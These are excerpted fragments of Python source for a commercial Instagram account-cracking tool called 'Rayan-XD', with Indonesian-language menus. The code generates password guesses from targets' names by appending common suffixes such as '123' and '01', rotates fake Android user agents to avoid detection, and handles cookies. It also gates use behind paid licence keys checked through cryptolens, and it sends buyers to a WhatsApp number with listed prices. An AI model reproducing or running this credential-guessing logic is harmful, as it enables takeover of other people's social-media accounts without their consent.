...
\t╚═╝╚═╩╝─╚═╩═╝╚═╩═╝╚═╝╚══╩═══╝""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
  ...
  #      self.loadCookie(Instagram)
    ...
    def ua_Cok(self):
        rr = random.randint
        rc = random.choice
        real = str(rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"]))
...
{N}[{H}+{N}] {H}RAYAN OK{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                           ...
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"321", pasw+"66", pasw+"01", pasw+"02", pasw+"03", pasw+"04", pasw+"05", pasw+"06", pasw+"07", pasw+"08", pasw+"09", pasw+"55", pasw+"888",pasw.lower()]
                        if 'satu' in method:
    ...
    def UgentsLite(self):
        ...
        self.e = random.choice(['Build/QP1A.190711.020; wv)','Build/RP1A.200720.011; wv)','Build/RP1A.201005.001; wv)','Build/TP1A.220905.001; wv)','Build/RKQ1.201217.002; wv)','Build/LRX22G)','Build/SP1A.210812.016; wv)'])
        useragent = f'''Mozilla/5.0 (Linux; U; Android 10; {self.a} {self.e} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.b}.0.{self.c}.{self.d} Mobile Safari/537.36'''
        return useragent
...
def key():
	...
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server NazriXD",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);Instagram()
	except KeyError:
...
def cek():
	...
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key=%s"%(x)).json()['licenseKey']['key'];Instagram()
	except KeyError:
		prints(Panel(f"{P2}Lisensi Kamu Sudah Kadaluwarsa Silahkan Beli Lisensi Ke Admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
#	os.popen('play-audio login.mp3')
	prints(Panel(f"{P2}Masukan Lisensi Kamu Untuk Login Tools Rayan-XD\nJika Kamu Belum Mempunyai Lisensi Ketik {H2}Beli {P2}Untuk Melihat Harga Lisensi",width=80,padding=(0,2),style=f"{color_table}"))
	key = input(f" {H}•{N} Masukan Lisensi : {H}")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{H2}Selamat Lisensi Kamu Berhasil Terdaftar Di Server Rayan-XD",width=80,padding=(0,5),style=f"{color_table}"));time.sleep(3);Instagram()
	except KeyError:
		prints(Panel(f"{P2} Lisensi Yang Anda Masukan Tidak Terdaftar Silahkan Beli Terlebih Dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+rayanganteng+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
def cek():
	...
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key=%s"%(x)).json()['licenseKey']['key'];Instagram()
		...
		prints(Panel(f"{P2}Lisensi Kamu Kadaluwarsa Silakan Beli Ke Admin!!!",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+rayanganteng+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    prints(Panel(f"{P2}[{H2}01{P2}].1 Minggu {H2}50.000 {P2}Max Pemakaian 1 Device\n{P2}[{H2}02{P2}].1 Bulan {H2}100.000{P2} Max Pemakaian 5 Device\n{P2}[{H2}03{P2}].Open Sourcecode Full Update {H2}480.000",width=80,padding=(0,15),style=f"{color_table}"))
    ...
    elif zxc in ["1","01"]:prints(f" {H2}•{P2} Anda Akan Di Arahkan Ke WhatsApp");os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+rayanganteng+mau+beli+lisensi+Instagram+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:prints(f" {H2}•{P2} Anda Akan Di Arahkan Ke WhatsApp");os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+mau+beli+lisensi+Instagram+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:prints(f" {H2}•{P2} Anda Akan Di Arahkan Ke WhatsApp");os.system("xdg-open https://wa.me/+6285852768706?text=assalamualaikum+bang+rayanganteng+mau+beli+lisensi+Instagram+full+sourcecode");time.sleep(2);exit()
    else:prints(f" {H2}•{P2} Ngetik Yang Bener Cuyy");time.sleep(3);cek_lisensi_aktif()
